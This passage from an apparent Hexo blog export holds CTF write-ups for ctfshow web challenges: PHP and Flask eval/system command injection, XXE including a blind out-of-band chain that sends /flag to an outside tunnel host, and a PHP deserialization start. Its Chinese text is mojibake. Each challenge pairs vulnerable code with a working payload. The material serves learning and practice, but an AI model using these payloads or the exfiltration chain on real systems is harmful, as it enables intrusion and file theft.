<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=?&gt;&lt;?php eval($_POST[1]);&amp;1=system(&#x27;cat flag*&#x27;);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong><code>FILE_APPEND</code></strong></th>
<th>å¦‚æœæ–‡ä»¶ <code>filename</code> å·²ç»å­˜åœ¨ï¼Œè¿½åŠ æ•°æ®è€Œä¸æ˜¯è¦†ç›–ã€‚</th>
</tr>
</thead>
</table>
<h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=*/system(&#x27;tac f*&#x27;);/*</span><br></pre></td></tr></table></figure>

<h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo sqrt(-1);</span><br></pre></td></tr></table></figure>

<p>ç»“æœä¸ºNAN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=-1</span><br></pre></td></tr></table></figure>

<h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]); </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=ctf::flag</span><br></pre></td></tr></table></figure>

<h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>?ctfshow&#x3D;flag</p>
<h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 17)&#123;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 8)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl ../*</span><br></pre></td></tr></table></figure>



<h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 6)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>



<h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 5)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>



<h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>æºç å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰import os</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	if &#x27;os&#x27; not in code:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>?code&#x3D;open(â€˜&#x2F;flagâ€™).read()</p>
<h2 id="web426-web431"><a href="#web426-web431" class="headerlink" title="web426-web431"></a>web426-web431</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import re</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	reg = re.compile(r&#x27;os|popen&#x27;)</span><br><span class="line">    	if reg.match(code)==None:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®yvå¸ˆå‚…blogåŒ¹é…å¥½åƒæœ‰é—®é¢˜,æ³¨æ„æœ‰ä¸ªç©ºæ ¼åœ¨å‰é¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>web431</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	reg = re.compile(r&#x27;os|open|system|read|eval|str&#x27;)</span><br><span class="line">    	if reg.match(code)==None:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<h2 id="web432ä¸ä¼š"><a href="#web432ä¸ä¼š" class="headerlink" title="web432ä¸ä¼š"></a>web432ä¸ä¼š</h2><h2 id="web450"><a href="#web450" class="headerlink" title="web450"></a>web450</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line">if(preg_match(&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;, $ctfshow))&#123;</span><br><span class="line">    eval(&quot;($ctfshow)();&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure>

<h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;, $ctfshow))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/phpinfo/&#x27;, $ctfshow))&#123;</span><br><span class="line">        eval(&quot;($ctfshow)();&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=aaahppo^phphppo^aaainfo</span><br></pre></td></tr></table></figure>

<h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctfshow=$_GET[&#x27;ctfshow&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!preg_match(&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;, $ctfshow))&#123;</span><br><span class="line">    eval($ctfshow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctfshow=((p).(h).(p).(i).(n).(f).(o))();</span><br></pre></td></tr></table></figure>

<h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowxxe</title>
    <url>/2023/03/13/ctfshow%E5%90%88%E9%9B%86-ctfshowxxe/</url>
    <content><![CDATA[<p>   xxe</p>
<span id="more"></span>

<p><a href="https://blog.csdn.net/qq_63844103/article/details/128060556?ops_request_misc=%7B%22request_id%22:%22167868664316800182744486%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=167868664316800182744486&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-128060556-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=xxe&spm=1018.2226.3001.4187">(8æ¡æ¶ˆæ¯) ã€webå®‰å…¨ã€‘â€”â€”XXEæ¼æ´å¿«é€Ÿå…¥é—¨_xxeæ¼æ´åˆ©ç”¨_ç™½æ˜¼å®‰å…¨çš„åšå®¢-CSDNåšå®¢</a></p>
<p><strong>å†…éƒ¨å®ä½“å°±ç›¸å½“äºè‡ªå·±ç¼–å†™DTDå†…å®¹ï¼Œè€Œå¤–éƒ¨å®ä½“å°±ç›¸å½“äºå¼•å…¥å¤–éƒ¨çš„DTDå†…å®¹</strong></p>
<p>å¤–éƒ¨å®ä½“:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å‚æ•°å®ä½“çš„<strong>å£°æ˜</strong>ï¼š<code>&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt;</code></p>
<p><strong>å¼•ç”¨</strong>å‚æ•°å®ä½“çš„æ–¹æ³•ï¼š<code>%å®ä½“åç§°;</code></p>
<h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);   <span class="comment">//$domç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;     <span class="comment">//$credsèŠ‚ç‚¹çš„ctfshow</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>hackbaræ— æ³•ä¼ å‚ï¼Œåªèƒ½bpä¼ å‚,ä¿®æ”¹æ–‡æœ¬é•¿åº¦ï¼Œéšä¾¿é•¿åº¦å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;zhou&gt;   //æ ¹å…ƒç´ </span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;   //å­å…ƒç´    å¼•ç”¨ä¸€èˆ¬å®ä½“çš„æ–¹æ³•ï¼š&amp;å®ä½“åç§°</span><br><span class="line">&lt;/zhou&gt;</span><br></pre></td></tr></table></figure>

<p>å…³äºsimplexml_import_dom</p>
<p>simplexml_import_dom() å‡½æ•°æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡ã€‚</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom = new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&#x27;&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">$xml = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;from;</span><br><span class="line">?&gt;</span><br><span class="line">//è¾“å‡ºï¼šJohn</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag        &#x2F;&#x2F;fileåè®®</p>
<p><strong>DOM èŠ‚ç‚¹</strong></p>
<p>æ ¹æ® DOMï¼ŒXML æ–‡æ¡£ä¸­çš„æ¯ä¸ªæˆåˆ†éƒ½æ˜¯ä¸€ä¸ª<strong>èŠ‚ç‚¹</strong>ã€‚</p>
<p>DOM æ˜¯è¿™æ ·è§„å®šçš„ï¼š</p>
<ul>
<li>æ•´ä¸ªæ–‡æ¡£æ˜¯ä¸€ä¸ªæ–‡æ¡£èŠ‚ç‚¹</li>
<li>æ¯ä¸ª XML å…ƒç´ æ˜¯ä¸€ä¸ªå…ƒç´ èŠ‚ç‚¹</li>
<li>åŒ…å«åœ¨ XML å…ƒç´ ä¸­çš„æ–‡æœ¬æ˜¯æ–‡æœ¬èŠ‚ç‚¹</li>
<li>æ¯ä¸€ä¸ª XML å±æ€§æ˜¯ä¸€ä¸ªå±æ€§èŠ‚ç‚¹</li>
<li>æ³¨é‡Šæ˜¯æ³¨é‡ŠèŠ‚ç‚¹</li>
</ul>
<h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374-376"></a>web374-376</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰echo</p>
<p>åœ¨ç½‘ç«™ä¸‹åˆ›å»ºä¸€ä¸ªtest.dtdæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;https://384fb1c7.r2.cpolar.cn/xxe/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªæ¥æ”¶$fileçš„phpæ–‡ä»¶ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://384fb1c7.r2.cpolar.cn/xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span>   </span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ‰§è¡Œæˆ‘ç½‘ç«™ä¸‹çš„dtdå†…å®¹æ¥è®¿é—®æˆ‘çš„ç½‘ç«™ï¼Œè·å¾—flag</p>
<p><code>ctfshow&#123;67b34bff-45b9-4935-bfb4-679f7fdd10b4&#125;</code></p>
<p>web375</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p><code>Content-Type: application/xml;charset=utf-8</code></p>
<p>æŠ“åŒ…è¿”å›çœ‹ç±»å‹å¯çŸ¥xmlæäº¤å‚æ•°</p>
<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></p>
<p>å³å¯å›æ˜¾</p>
<p><code>ctfshow&#123;34c67ba7-bb24-4ac1-a485-c0e8c15dc550&#125;</code></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_ååºåˆ—åŒ–</title>
    <url>/2023/02/02/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>æŒç»­å­¦ä¹ ä¸­ã€‚ã€‚ã€‚</p>
   <span id="more"></span>

<h2 id="web254-â€“phpç±»å’Œå¯¹è±¡"><a href="#web254-â€“phpç±»å’Œå¯¹è±¡" class="headerlink" title="web254 â€“phpç±»å’Œå¯¹è±¡"></a>web254 â€“phpç±»å’Œå¯¹è±¡</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>username=xxxxxx&amp;password=xxxxxx</code></p>
<p>-&gt;å¯ä»¥ç†è§£ä¸ºâ€œçš„â€</p>
